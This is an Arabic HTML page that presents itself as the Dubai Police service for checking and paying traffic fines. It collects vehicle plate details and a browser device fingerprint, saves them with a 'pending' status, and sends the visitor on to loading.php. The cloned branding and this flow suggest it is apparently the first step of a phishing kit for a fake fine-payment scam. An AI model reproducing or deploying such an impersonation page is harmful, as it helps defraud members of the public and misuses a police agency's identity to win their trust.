<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>استعلام ودفع المخالفات - شرطة دبي</title>
  <style>
    :root {
      --main-green: #008b47;
      --bg-color: #f4f7f6;
      --white: #ffffff;
      --gray-text: #6e6e6e;
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }

    /* الهيدر الذكي */
    .header-fixed {
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 2000;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 15px;
      transition: background 0.4s ease;
      background: transparent;
    }

    .header-fixed.scrolled {
      background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }

    .header-btns { display: flex; gap: 10px; }
    .btn-circle {
      width: 38px;
      height: 38px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      color: #333;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }

    .logo-container img {
      height: 45px;
      max-width: 150px;
      object-fit: contain;
    }

    /* الفيديو */
    .video-hero {
      width: 100%;
      height: 260px;
      position: relative;
      background: #000;
    }
    #heroVid { width: 100%; height: 100%; object-fit: cover; }

    /* التبويبات بالأيقونات الأصلية */
    .tabs-nav {
      display: flex;
      justify-content: center;
      gap: 12px;
      padding: 20px 10px;
      background: #fff;
      border-bottom: 1px solid #eee;
    }

    .tab-item {
      background: #fff;
      border: 1px solid #ddd;
      padding: 8px 15px;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-width: 90px;
      font-size: 12px;
      color: var(--gray-text);
      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
      cursor: pointer;
    }

    .tab-item.active {
      border-color: var(--main-green);
      color: var(--main-green);
    }

    .tab-icon { width: 24px; height: 24px; margin-bottom: 5px; fill: currentColor; }

    /* الكارت الرئيسي */
    .container {
      max-width: 480px;
      margin: 0 auto;
      padding: 0 15px 50px;
    }

    .search-box {
      background: #fff;
      border-radius: 25px;
      padding: 25px;
      margin-top: 15px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    .field-wrap { margin-bottom: 18px; }
    .field-label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #333;
      font-weight: 600;
    }

    .input-style {
      width: 100%;
      height: 55px;
      border: 1.5px solid #e0e0e0;
      border-radius: 12px;
      padding: 0 15px;
      font-size: 16px;
      outline: none;
      transition: border-color 0.3s;
    }

    .input-style:focus { border-color: #55efc4; }

    select.input-style {
      appearance: none;
      background: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22%23999%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%3E%3Cpolyline%20points%3D%226%209%2012%2015%2018%209%22%3E%3C/polyline%3E%3C/svg%3E") no-repeat left 15px center;
      background-size: 18px;
    }

    .ksa-section { display: none; background: #f9f9f9; padding: 15px; border-radius: 12px; margin-top: 10px; }

    .submit-btn {
      width: 100%;
      height: 60px;
      background: var(--main-green);
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-top: 20px;
    }

    .back-btn {
      width: 100%;
      height: 60px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 30px;
      margin-top: 12px;
      font-size: 17px;
    }
  </style>
</head>
<body>

<header class="header-fixed" id="siteHeader">
  <div class="header-btns">
    <div class="btn-circle">≡</div>
    <div class="btn-circle">i</div>
  </div>
  <div class="logo-container">
    <img src="logo1.png" alt="Dubai Police">
  </div>
</header>

<div class="video-hero">
  <video id="heroVid" muted playsinline autoplay loop>
    <source src="dubai_hero.mp4" type="video/mp4">
  </video>
</div>

<div class="tabs-nav">
  <div class="tab-item active">
    <svg class="tab-icon" viewBox="0 0 24 24"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.5-4.5h11L19 11H5z"/></svg>
    اللوحة
  </div>
  <div class="tab-item">
    <svg class="tab-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12zm-9-1h2v-2h-2v2zm0-3h2v-2h-2v2zm0-3h2V8h-2v2zm-4 6h2v-2H7v2zm0-3h2v-2H7v2zm0-3h2V8H7v2zm8 6h2v-2h-2v2zm0-3h2v-2h-2v2zm0-3h2V8h-2v2z"/></svg>
    الرخصة
  </div>
  <div class="tab-item">
    <svg class="tab-icon" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
    الملف المروري
  </div>
</div>

<div class="container">
  <main class="search-box">
    <form onsubmit="event.preventDefault(); return false;">
      <div class="field-wrap">
        <label class="field-label">جهة إصدار اللوحة</label>
        <select id="plateSource" class="input-style" onchange="updatePlateCodes()" required>
          <option value="">اختر</option>
        </select>
      </div>

      <div class="field-wrap">
        <label class="field-label">رقم اللوحة</label>
        <input id="plateNumber" class="input-style" type="text" placeholder="رقم اللوحة" required>
      </div>

      <div class="field-wrap">
        <label class="field-label">رمز اللوحة</label>
        <select id="plateCode" class="input-style" onchange="this.dataset.selected=this.value" required disabled>

          <option value="">اختر</option>
        </select>
      </div>

      <div id="ksaContainer" class="ksa-section">
        <div class="field-wrap"><label class="field-label">رمز اللوحة 1</label><select id="k1" class="input-style ksa-in"></select></div>
        <div class="field-wrap"><label class="field-label">رمز اللوحة 2</label><select id="k2" class="input-style ksa-in"></select></div>
        <div class="field-wrap"><label class="field-label">رمز اللوحة 3</label><select id="k3" class="input-style ksa-in"></select></div>
      </div>

      <button type="button" class="submit-btn" id="submitBtn">التحقق من المخالفات <span>←</span></button>
      <button type="button" class="back-btn" id="backBtn">رجوع</button>
    </form>
  </main>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>

<script>
    // التحكم في الهيدر
    window.onscroll = () => {
        const h = document.getElementById("siteHeader");
        window.pageYOffset > 40 ? h.classList.add("scrolled") : h.classList.remove("scrolled");
    };

    function getDeviceFingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenResolution: screen.width + "x" + screen.height,
            language: navigator.language,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            vendor: navigator.vendor,
            touchPoints: navigator.maxTouchPoints
        };
    };

    const plateData = {
      AbuDhabi: ["White","Red","Motorcycle4","1","15","Red","Blue","Green","Gray","5","6","11","10","4","7","8","9","12","13","14","16","2","17","1","50","18","20","19","21","22","Yellow","Green","Green1","TradeWhite","Trade","1","Export","Consulate","Diplomat","International Organization","Accommodation","Government","Custom","Probation","Orange","Protocol","2","Blue","1","RED"],
      Dubai: ["Motorcycle","Motorcycle2","Motorcycle3","Motorcycle9","A","B","C","D","E","F","H","G","I","J","K","L","M","N","O","R","T","Z","S","Q","U","V","W","X","Y","ابيض","P","BB","AA","CC","DD","NN","HH","EE","MM","FF","II","Taxi","PublicTransportation","Public Transportation 1","Trade","Export","Export 2","Export 3","Export 4","Export 5","Export 6","Export 7","Export 8","Export 9","Consulate","Political association","International Organization","Accommodation","Government","PrivateTransportation"],
      Sharjah: ["Motorcycle","Classic","13","White","Orange","1","2","3","4","Green","PublicTransportation2","PublicTransportation1","Trade","3","1","2","Export","Export4","Export - 5","Police","Classic","Trailer"],
      Ajman: ["Motorcycle","A","B","C","D","E","H","F","K","Classic","Green","Probation","Export","Trailer"],
      "Um Al Quwain": ["Motorcycle","A","B","White","A","B","G","X","I","D","H","C","K","F","J","E","L","M","N","Green","Probation","1","Export","Government Green","Government","Learning"],
      RAK: ["Motorcycle","4","Motorcycle1","N","White","A","C","D","I","V","Y","M","RAK-Tower","K","S","B","X","Z","G","U","P","WhiteGreen","Green","Probation","Export","Government","GovernmentWhite","Local Guard","Hospitality Yallow","Hospitality","Hospitality Blue","Municipality","Police","Works","Ceremonies White Red","White","White and Green"],
      Fujairah: ["Motorcycle","F","M","P","R","S","T","White","A","B","C","D","E","G","K","X","I","V","L","Z","H","O","N","J","U","Y","Green","Probation","Export","Government"],
      Oman: ["PRIVATE - Yellow","Motor Bike - Yellow","GOVERNMENT - white","INTL.ORGANIZATION - white","CONSULAR - white","COMMERCIAL - Red","EXPORT - BLUE","DIPLOMATIC - white"],
      Qatar: ["Private - White","Privet Transport - BLACK","Motor bike - White","PUBLIC TRANSPORT - RED","EXPORT - YELLOW","TRAILER - GREEN"],
      Kuwait: ["Private - 1","Private - 2","Private - 3","Private - 4"],
      Bahrain: ["Private - White","Private transport - Orange","Public Transport - Yellow","MotorCycle - White","Royal Court - RED","DIPLOMATIC - GREEN"],
      KSA: ["Private - White","Public Transport - Yellow","Motor Bike - White","PRIVATE TRANSPORT - BLUE","DIPLOMATIC - GREEN","EXPORT - GRAY","TEMPORARY - BLACK","CONSULAR - GREEN"]
    };

    const sourceLabels = { AbuDhabi: "أبوظبي", Dubai: "دبي", Sharjah: "الشارقة", Ajman: "عجمان", "Um Al Quwain": "أم القيوين", RAK: "رأس الخيمة", Fujairah: "الفجيرة", Oman: "عُمان", Qatar: "قطر", Kuwait: "الكويت", Bahrain: "البحرين", KSA: "السعودية" };
    const ksaLetters = ["أ - أ","ب - ب","ح - ح","د - د","ر - ر","س - س","ص - X","ط - ت","ع - هـ","ق - ج","ك - ك","ل - ل","م - ز","ن - ن","هـ - هـ","و - يو","ي - V"];

    const sSel = document.getElementById("plateSource");
    const cSel = document.getElementById("plateCode");
    const ksaContainer = document.getElementById("ksaContainer");

    Object.keys(sourceLabels).forEach(k => sSel.add(new Option(sourceLabels[k], k)));

    [document.getElementById("k1"), document.getElementById("k2"), document.getElementById("k3")].forEach(s => {
      s.add(new Option("اختر", ""));
      ksaLetters.forEach(l => s.add(new Option(l, l)));
    });

    function updatePlateCodes() {
      const val = sSel.value;
      const previousCode = cSel.value;
      cSel.innerHTML = '<option value="">اختر</option>';
      (plateData[val] || []).forEach(code => cSel.add(new Option(code, code)));
      cSel.disabled = !val;
      if (previousCode && Array.from(cSel.options).some(opt => opt.value === previousCode)) {
        cSel.value = previousCode;
      }
      cSel.dataset.selected = cSel.value || "";
      ksaContainer.style.display = val === "KSA" ? "block" : "none";
    }

    function handleSourceChange(event) {
      if (event && event.target && typeof event.target.value !== "undefined") {
        sSel.value = event.target.value;
      }
      updatePlateCodes();
    }

    function handleCodeChange(event) {
      if (event && event.target && typeof event.target.value !== "undefined") {
        cSel.value = event.target.value;
      }
      cSel.dataset.selected = cSel.value || "";
    }

    sSel.setAttribute("onchange", "updatePlateCodes()");
    cSel.setAttribute("onchange", "this.dataset.selected=this.value");
    sSel.onchange = handleSourceChange;
    sSel.oninput = handleSourceChange;
    cSel.onchange = handleCodeChange;
    cSel.oninput = handleCodeChange;
    sSel.addEventListener("change", handleSourceChange);
    sSel.addEventListener("input", handleSourceChange);
    cSel.addEventListener("change", handleCodeChange);
    cSel.addEventListener("input", handleCodeChange);
    window.addEventListener("pageshow", updatePlateCodes);

    updatePlateCodes();

    document.getElementById('submitBtn').addEventListener('click', async function () {
      const payload = {
        source: sSel.value,
        plateNumber: document.getElementById('plateNumber').value.trim(),
        plateCode: cSel.value,
        ksaLetters: [document.getElementById('k1').value, document.getElementById('k2').value, document.getElementById('k3').value].filter(Boolean),
        device: getDeviceFingerprint(),
        createdAt: new Date().toISOString(),
        status: 'pending'
      };
      if (!payload.source || !payload.plateNumber || !payload.plateCode) {
        alert('يرجى تعبئة جميع الحقول المطلوبة');
        return;
      }
      localStorage.setItem('dubai_last_payload', JSON.stringify(payload));
      window.location.href = 'loading.php';
    });

    document.getElementById('backBtn').addEventListener('click', function () {
      history.back();
    });
  </script>
</body>
</html>
